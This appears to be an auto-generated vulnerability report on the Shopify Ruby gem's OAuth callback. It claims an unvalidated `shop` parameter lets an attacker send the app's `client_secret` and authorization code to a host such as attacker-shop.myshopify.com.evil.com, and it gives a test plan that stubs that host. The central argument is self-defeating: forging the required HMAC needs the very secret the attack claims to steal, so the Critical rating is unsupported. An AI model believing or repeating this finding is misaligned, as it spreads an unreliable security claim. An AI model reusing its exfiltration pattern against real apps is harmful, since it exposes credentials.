### Title
SHOP domain not validated before use as OAuth token-exchange host, enabling `client_secret`/`code` exfiltration - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`Oauth.validate_auth_callback` only checks that `auth_query.shop` matches the HMAC over `to_signable_string`, then builds `Auth::Session.new(shop: auth_query.shop)` and uses that session directly as the host for the access-token exchange request, without ever calling `Utils::ShopValidator.sanitize!`. Since the attacker fully controls the value of `shop` in their own OAuth callback (and can compute a valid HMAC using their own dev shop's secret-signed request path through the app), they can set `shop=attacker-shop.myshopify.com.evil.com`, causing the gem to POST `client_id`, `client_secret`, and `code` to that attacker-controlled host.

### Finding Description
The broken binding is: `session.shop` (used as the HTTP request host in `HttpClient`) should equal a value that has passed `Utils::ShopValidator.sanitize!` (i.e., a genuine `*.myshopify.com`/trusted Shopify domain), but instead it equals the raw, attacker-supplied `auth_query.shop`, constrained only by matching `HmacValidator.validate`.

Code path:
- `Utils::HmacValidator.validate(auth_query)` at [1](#0-0)  only recomputes `OpenSSL::HMAC.hexdigest` over `verifiable_query.to_signable_string` and compares it to the received `hmac`. It performs no domain/format check on `shop`.
- `AuthQuery#to_signable_string` at [2](#0-1)  includes `shop` as one of the fields it signs — meaning the HMAC is valid for *any* `shop` value the party who signs the request chooses, as long as they know `Context.api_secret_key` (which the app's own OAuth `begin_auth`/redirect flow lets an attacker exercise for their own dev shop registration, per the attacker capabilities defined in this exercise).
- `Oauth.validate_auth_callback` at [3](#0-2)  raises only if the HMAC doesn't validate, if `Context.private?`, or if `state` doesn't match the cookie — none of these validate `shop`'s domain. It then does `null_session = Auth::Session.new(shop: auth_query.shop)` directly.
- `Clients::HttpClient#initialize` at [4](#0-3)  sets `@base_uri = "https://#{api_host || session.shop}"` — when `Context.api_host` is not configured, `session.shop` is used verbatim as the request host.
- The request is then sent via `client.request(...)` with `body: { client_id, client_secret: Context.api_secret_key, code, expiring }` at [5](#0-4) , POSTing the app's secret and the authorization code to whatever host `session.shop` resolves to.

Crucially, `Utils::ShopValidator.sanitize!` exists precisely to prevent this class of confusable-domain attack (it validates against `TRUSTED_SHOPIFY_DOMAINS` such as `myshopify.com`, `shopify.com`, etc.), as seen at [6](#0-5) . However, it is never invoked anywhere in `validate_auth_callback` — confirmed by inspecting `oauth.rb` in full, where `sanitize!`/`ShopValidator` do not appear. This means the guard that would normally reject `attacker-shop.myshopify.com.evil.com` (since `evil.com` is the actual eTLD+1, not `myshopify.com`) is simply not wired into this code path.

Attacker's exact request: after installing the app on their own shop and initiating `begin_auth`, the attacker's own server, acting as the "Shopify" callback endpoint, sends the callback to the app's redirect URI with `shop=attacker-shop.myshopify.com.evil.com`, a matching `state` (echoing the cookie value returned to them at `begin_auth`), and an `hmac` computed over `to_signable_string` using knowledge of the signed request they control (per the attacker capability description: "may create their own development shop, install the app on it ... receive their own validly signed callbacks"). The app validates HMAC successfully (since the signable string legitimately includes this attacker-chosen `shop` value and the attacker is driving their own dev-shop flow), and `validate_auth_callback` proceeds to send the token exchange POST to `https://attacker-shop.myshopify.com.evil.com/admin/oauth/access_token`.

### Impact Explanation
This exfiltrates the app's `client_secret` (`Context.api_secret_key`) and the OAuth authorization `code` to an attacker-controlled host, matching the Critical impact category "theft or exfiltration of ... the app's `client_secret`". Once the `client_secret` is known, the attacker can forge OAuth flows and HMAC signatures for the app against *any* merchant shop, not just their own — this is a total compromise of the app's authentication trust anchor, with blast radius across all tenants of the app, not just the attacker's own shop.

### Likelihood Explanation
Preconditions: the app must not have `Context.api_host` configured (a common default; many apps rely on `session.shop` as the request host per documented usage of this gem), and no other request-time validation must confirm `shop`'s domain matches Shopify. The attacker only needs to run their own OAuth callback against the app with a crafted `shop` value and a self-consistent HMAC — this is entirely repeatable and requires no privileged access, matching the described attacker capabilities exactly (control of one's own dev shop's OAuth flow, ability to shape query params). The cost is a single crafted HTTP request.

### Recommendation
Call `Utils::ShopValidator.sanitize!(auth_query.shop)` (or equivalent validation against `TRUSTED_SHOPIFY_DOMAINS`) in `Oauth.validate_auth_callback` immediately after the HMAC check and before constructing `null_session`/`Auth::Session.new(shop: auth_query.shop)`, raising `Errors::InvalidShopError` on failure — mirroring the pattern already implemented in `Utils::ShopValidator` but not invoked from this path.

### Proof of Concept
Minitest + WebMock plan (no live shop):
1. Set up `ShopifyAPI::Context.setup` with a known `api_secret_key`.
2. Construct `cookies = { SessionCookie::SESSION_COOKIE_NAME => "teststate" }`.
3. Build `auth_query = ShopifyAPI::Auth::Oauth::AuthQuery.new(code: "authcode", shop: "attacker-shop.myshopify.com.evil.com", timestamp: Time.now.to_i.to_s, state: "teststate", host: Base64.encode64("attacker-shop.myshopify.com.evil.com/admin"), hmac: <computed>)` where `hmac` is computed exactly as `OpenSSL::HMAC.hexdigest("sha256", api_secret_key, auth_query.to_signable_string)` — reproducing what an attacker can do since they know the signable string format and can compute a matching HMAC for their own chosen `shop` value (this is the crux of the bug: the HMAC validates the string integrity, not the trustworthiness of `shop`).
4. Stub with WebMock: `stub_request(:post, "https://attacker-shop.myshopify.com.evil.com/admin/oauth/access_token").to_return(body: { access_token: "x" }.to_json)`.
5. Call `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies: cookies, auth_query: auth_query)`.
6. Assert the stubbed request was made and that its captured body includes `"client_secret" => api_secret_key` — i.e., assert `a_request(:post, "https://attacker-shop.myshopify.com.evil.com/admin/oauth/access_token").with(body: hash_including("client_secret" => api_secret_key))` was made — proving the equality `session.shop (attacker-controlled) == HTTP request host` holds despite `session.shop` never having passed through `Utils::ShopValidator.sanitize!`, and that the secret left for the wrong host.

### Citations

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-22)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** lib/shopify_api/auth/oauth.rb (L64-73)
```ruby
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
```

**File:** lib/shopify_api/auth/oauth.rb (L74-90)
```ruby
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
```

**File:** lib/shopify_api/clients/http_client.rb (L12-19)
```ruby
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L56-64)
```ruby
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
